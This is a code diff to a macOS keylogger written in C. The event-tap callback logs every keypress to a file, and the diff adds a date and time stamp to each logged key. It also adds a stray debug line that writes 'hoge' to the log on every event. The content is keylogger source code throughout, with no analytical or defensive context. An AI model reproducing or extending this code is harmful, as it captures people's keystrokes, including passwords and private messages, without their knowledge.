@@ -1,3 +1,5 @@
+#include <stdio.h>
+#include <time.h>
 #include "keylogger.h"
 
 int main(int argc, const char *argv[]) {
@@ -55,13 +57,18 @@ int main(int argc, const char *argv[]) {
 
 // The following callback method is invoked on every keypress.
 CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
+    fprintf(logfile, "hoge");
     if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }
 
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
+    // Get current time_t
+    time_t currentTime = time(NULL);
+    char dateString[128];
+    strftime(dateString, sizeof(dateString), "%Y/%m/%d %a %H:%M:%S", localtime(&currentTime));
     // Print the human readable key to the logfile.
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
+    fprintf(logfile, "%s, %s\n", dateString, convertKeyCode(keyCode));
     fflush(logfile);
 
     return event;
